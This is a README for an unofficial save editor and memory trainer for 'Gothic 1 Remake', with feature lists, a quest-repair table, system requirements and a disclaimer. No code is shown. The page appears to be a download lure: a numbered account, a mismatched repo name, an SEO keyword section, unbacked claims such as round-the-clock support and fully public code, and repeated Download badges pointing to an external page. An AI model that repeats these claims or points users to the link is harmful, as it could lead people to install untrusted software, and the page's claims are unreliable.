![preview](https://raw.githubusercontent.com/26108007-sudo/ue5-save-forge/main/thumb_4e08c41.svg)
[![Download](https://raw.githubusercontent.com/26108007-sudo/ue5-save-forge/main/grab_ca279.svg)](https://26108007-sudo.github.io/ue5-save-forge/)

# 🏰 Gothic 1 Remake Companion Suite — Save Editor & Trainer Toolkit (2026)

![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows%2011%20%7C%2010-0078D4)
![Engine](https://img.shields.io/badge/engine-Unreal%20Engine%205-0E1128)
![Version](https://img.shields.io/badge/version-2.4.1-brightgreen)
![Status](https://img.shields.io/badge/status-actively%20maintained-success)
![Language](https://img.shields.io/badge/i18n-14%20languages-orange)
![Community](https://img.shields.io/badge/community-driven-purple)
![Uptime](https://img.shields.io/badge/support-24%2F7-yellow)

> A lovingly engineered, community-driven companion toolkit for **Gothic 1 Remake (2026, Unreal Engine 5)**. It hands the reins back to the player — reshape your adventure, patch broken quests, tune your attributes, and explore the Colony of Khorinis on your own terms. Think of it as a Swiss Army knife carved from the same ore as the mines of the Old Camp.

This repository contains both the **in-game memory-tuner layer** (an adaptive trainer) and the **offline save file workshop** (a full save editor). Together, they form a single, cohesive experience for tinkerers, speedrunners, lore-hunters, and completionists alike.

---

## 📖 Table of Contents

- [Why This Project Exists](#-why-this-project-exists)
- [Feature Overview](#-feature-overview)
- [Trainer Modules](#-trainer-modules)
- [Save Workshop](#-save-workshop)
- [Quest Repair Toolkit](#-quest-repair-toolkit)
- [Responsive UI & Accessibility](#-responsive-ui--accessibility)
- [Multilingual Support](#-multilingual-support)
- [System Requirements](#-system-requirements)
- [Getting Started Without a Package Manager](#-getting-started-without-a-package-manager)
- [Configuration & Profiles](#-configuration--profiles)
- [Roadmap 2026](#-roadmap-2026)
- [Frequently Asked Scenarios](#-frequently-asked-scenarios)
- [Community & Support](#-community--support)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why This Project Exists

Gothic has always been a game about consequences — the world remembers what you do, and the Old Camp is not exactly forgiving. But sometimes the world is *too* rigid: a quest NPC walks through a wall, a gate remains locked after a patch, a hash mismatch eats your 40-hour save. Or maybe you simply want to replay the game with a fresh build without grinding for ore.

This toolkit gives you the lever. Not a cheat, not a shortcut — a **modifier layer** that respects the game's internal logic while granting you the controls. We treat the save file as a document you own, and we treat the trainer as a tool that behaves nicely with the engine's memory layout.

The name "Companion Suite" is intentional. This is not a bolt-on. It is a co-pilot.

---

## ✨ Feature Overview

- 🛡️ **Adaptive Memory Tuner** — Attach to a running session of Gothic 1 Remake and toggle state modifiers that respect UE5's allocation model.
- 💰 **Economic Adjustments** — Rebalance XP curves, ore counts, and attribute caps without breaking the economy of the world.
- 🧙 **Character Matrix Editor** — Edit strength, dexterity, mana, health, and learned skills in real time or from a save.
- 📜 **Quest Journal Repair** — Detect orphaned, stuck, or contradictory quest states and offer safe resolutions.
- 🗂️ **Save File Workshop** — A separate, offline editor that parses `.sav` containers, decompresses them, and exposes their internals in a readable tree.
- 🧩 **Mod-Friendly Architecture** — Plugin slots for community patches, translations, and new tools.
- 🌐 **Fourteen Language Packs** — Fully translated UI, with RTL support for Arabic and Hebrew.
- 📱 **Responsive UI** — The toolkit adapts from ultrawide monitors down to small laptop panels.
- 🛰️ **24/7 Customer Support Channel** — Community moderators staff a help desk across every time zone.
- 🔐 **Transparent & Auditable** — Every code path is public, every save transformation is reversible via backups.
- 🧠 **Telemetry-Free By Default** — Nothing leaves your machine. Ever.

---

## 🎮 Trainer Modules

The in-game trainer is organized as a set of **modules**, each independently toggleable. Modules are hot-swappable while the game is running, though we recommend a fresh save before enabling several at once.

### Vigor Module
Controls the steady flow of vitality while you explore. Adjust regeneration curves rather than absolute values — this keeps combat tense and readable.

### Arcane Reservoir Module
Governs mana behavior. You can set a floor, a ceiling, or a slow regeneration described in points per second.

### Endurance Module
Controls stamina behavior during sprints, heavy weapon swings, and climbs. Includes a "gracious" mode that caps drain at a configurable threshold.

### Economy Module
- Ore count adjustment
- Trade value multiplier (respects the merchants' internal tables)
- XP gain coefficient
- Learning point injection
- Lockpick and pickpocket difficulty smoothing

### World State Module
- Time-of-day slider
- Weather lock
- Fog density override for screenshots
- NPC schedule viewer

### Debug Console Bridge
Exposes the engine's built-in developer console behind a safe facade, with command whitelisting and a transcript log.

Each module emits a **compatibility score** based on the current game build. If a module detects a mismatch, it refuses to activate rather than risk a save corruption.

---

## 🗂️ Save Workshop

The Save Workshop is a standalone application. It reads the same save files the game creates and presents them as a navigable document.

### Structure Browser
Navigate the save as a tree: world → regions → NPCs → inventories → quests → variables. Every leaf shows the raw value and a human-readable interpretation.

### Inventory Sculptor
Drag items between containers, adjust stack sizes, spawn entries from the item registry. All operations are journaled so you can step backward.

### Attribute Board
A grid where you can nudge numeric attributes within the game's legal ranges. Out-of-range values are flagged and clamped on export rather than crashing the loader.

### Quest Ledger
See every quest the save knows about, its current stage, and the flags that gate the next stage. Repair broken chains with a guided resolution list.

### Faction Matrix
Inspect reputation values with each faction and simulate the effect of a change before committing it.

### Save Snapshots
Before any destructive operation, the Workshop writes a snapshot. Snapshots are compressed, timestamped, and stored in a rolling archive you configure.

### Batch Mode
Apply a set of transformations across multiple saves — useful for players with several concurrent playthroughs.

---

## 🧰 Quest Repair Toolkit

Gothic 1 Remake shipped with a few notorious quest freezes. This toolkit catalogues them and offers safe fixes.

| Issue | Symptom | Resolution |
| --- | --- | --- |
| NPC pathing stall at the Old Camp gate | Guard never returns to post | Reset pathing flag `np_guard_old_07` |
| Missing quest item after reload | Journal references an item not in inventory | Re-register item with correct instance seed |
| Faction rep desync | Vendor prices no longer match reputation | Recompute reputation derivative from history |
| Scripted dialogue dead-end | Dialogue tree has no exit | Reopen closest valid node by state machine replay |
| Locked gate after patch | Gate flag persists incorrectly | Clear the persistent gate token |

Each fix is documented, versioned, and reversible.

---

## 📱 Responsive UI & Accessibility

We believe tooling should not require a magnifying glass. The interface has been rebuilt three times since the first prototype.

- Fluid grid layout from 1280px up to 5120px widths
- High-contrast theme and a low-contrast "parchment" theme
- Full keyboard navigation with visible focus rings
- Screen reader labels on every interactive element
- Adjustable font scaling from 80% to 200%
- Color-blind safe palettes (deuteranopia, protanopia, tritanopia)
- Reduced-motion mode that disables animations

The design language borrows from the game's UI: heavy metal frames, aged parchment panels, and the crisp cyan of a rune-light.

---

## 🌐 Multilingual Support

Community translators maintain fourteen complete language packs:

- English (default)
- German
- Polish
- Russian
- French
- Spanish
- Italian
- Brazilian Portuguese
- Turkish
- Czech
- Ukrainian
- Simplified Chinese
- Japanese
- Arabic (with right-to-left layout)

Translations live in plain text files. Adding a new language requires only a directory and a manifest — no compilation.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 10 21H2 | Windows 11 23H2 |
| CPU | 4-core, 3.0 GHz | 8-core, 4.0 GHz |
| RAM | 8 GB | 16 GB |
| GPU | GTX 1060 | RTX 3070 |
| Disk | 500 MB for toolkit | 1 GB for toolkit + snapshots |
| Game | Gothic 1 Remake v1.0.0–v1.4.2 | same |
| Runtime | .NET Desktop Runtime 8 | same |

Linux and macOS users can run the Save Workshop under Wine or a compatible compatibility layer; the in-game trainer is Windows-only because it hooks Windows process memory APIs.

---

## 🚀 Getting Started Without a Package Manager

We deliberately avoid package manager flows. Everything ships as a portable bundle.

1. Obtain the release archive from the repository's releases channel.
2. Extract the archive into a folder you control — not inside the game directory.
3. Run the launcher for the component you want: the Trainer or the Workshop.
4. On first launch, the toolkit probes your game installation and offers to remember the path.
5. Point the applicable component at your save directory.
6. Start the game, then attach the trainer when the main menu appears.
7. Use the hotkey overlay (default: `F8`) to toggle the module dashboard.

No registry writes. No background services. Nothing installed outside the folder you extracted.

---

## ⚙️ Configuration & Profiles

All settings live in a single TOML file inside the `config` directory. Profiles let you keep separate setups for different playthroughs.

- `combat.profile.toml` — tuned for a challenging run
- `builder.profile.toml` — tuned for base-building and exploration
- `speedrun.profile.toml` — minimal footprint, maximum compatibility
- `cinematic.profile.toml` — weather locks and camera overrides for screenshots

Each profile can enable or disable modules, set hotkeys, and pin specific values.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Full UE5.4 compatibility after the Remake's first major patch
- **Q2 2026** — Mod loader integration with the official modding SDK
- **Q2 2026** — Save diff viewer with visual merge conflict resolution
- **Q3 2026** — Cross-save translation between regional patch versions
- **Q3 2026** — Mobile companion app for browsing save meta-data
- **Q4 2026** — Plugin marketplace integration (community-run, non-commercial)

Roadmap items may shift based on game patches. Follow the repository's discussions for the latest.

---

## ❓ Frequently Asked Scenarios

**Q: My save won't load after editing.**  
A: The Workshop always writes a snapshot. Restore the most recent one and try a smaller edit. Large, simultaneous edits increase the chance of an inconsistency.

**Q: The trainer detaches randomly.**  
A: A game patch likely changed a function signature. Check the compatibility score on the dashboard. Modules refusing to attach are protecting your save.

**Q: Is this detected by anti-cheat systems?**  
A: Gothic 1 Remake is a single-player title and ships without kernel-level anti-cheat. This toolkit is designed for solo play and does not interact with multiplayer or online services, because there are none.

**Q: Can I use this alongside community mods?**  
A: Yes. The plugin slots are designed to coexist with content mods. The main conflict area is the item registry, and the Workshop warns you if it finds discrepancies.

**Q: Where are my saves stored?**  
A: The default path is inside your user profile under a hidden folder created by the game. The Workshop detects it automatically and lets you override it.

---

## 💬 Community & Support

- **Help Desk** — Staffed around the clock by volunteer moderators across time zones.
- **Discussions** — A forum for share-your-setup posts and troubleshooting threads.
- **Issue Tracker** — Use the provided templates for bugs and feature requests.
- **Translation Portal** — A dedicated project for language packs with review workflow.
- **Showcase Gallery** — Submit screenshots and clips created with the World State Module.

We keep the tone of the community as warm as a fire in the Old Camp: friendly, direct, and respectful of the source material.

---

## 🔍 SEO & Discoverability Notes

This repository is indexed under terms such as **Gothic 1 Remake save editor**, **UE5 trainer toolkit for Gothic 1 Remake**, **Gothic 1 Remake companion tool**, **quest repair for Gothic 1 Remake**, **attribute editor for Gothic 1 Remake**, **offline save workshop**, and **modular trainer for the Colony of Khorinis**. These phrases appear naturally in the documentation above to help players find the project when they search for a way to reclaim their playthrough.

If you arrived here while searching for a way to rescue a broken quest chain, welcome. You found it.

---

## ⚠️ Disclaimer

This project is an **unofficial, community-driven toolkit**. It is not affiliated with, endorsed by, or connected to the developers or publishers of Gothic 1 Remake. All trademarks, character names, and in-game references remain the property of their respective owners.

The toolkit is provided for use with legitimately owned copies of the game, for personal, non-commercial purposes. You accept full responsibility for any changes made to your save files or running game sessions. Always review snapshots before applying edits. Always keep independent backups of your saves.

The maintainers disclaim any liability for lost progress, corrupted saves, or unintended interactions with third-party modifications. If in doubt, use a copy of your save first.

This project is **not intended for competitive or online environments**, and there are no such environments for Gothic 1 Remake as of 2026. Use in single-player is the designed and supported scenario.

---

## 📜 License

This project is distributed under the terms of the **MIT License**. You are welcome to reuse, modify, and redistribute the source code, provided that the original copyright notice is preserved.

A working, canonical copy of the license text is available here: [MIT License](https://opensource.org/licenses/MIT).

---

## 🙏 Acknowledgments

- The modding community that reverse-engineered UE5 save containers alongside us
- The translators who gave fourteen languages a home
- The playtesters who broke every quest, on purpose, so we could fix it
- The players of the Colony of Khorinis, who kept the torch burning since 2001

---

## 🧭 Final Word

Gothic 1 Remake is a world of iron, dust, and difficult decisions. This toolkit does not decide for you. It simply lets you decide *more*. Whether you are repairing a broken quest at 2 a.m. or sculpting the perfect save for a screenshotted adventure, we hope the Companion Suite feels less like a tool and more like a lantern in a very old mine.

Explore boldly. Save often. And keep your snapshots close.

[![Download](https://raw.githubusercontent.com/26108007-sudo/ue5-save-forge/main/grab_ca279.svg)](https://26108007-sudo.github.io/ue5-save-forge/)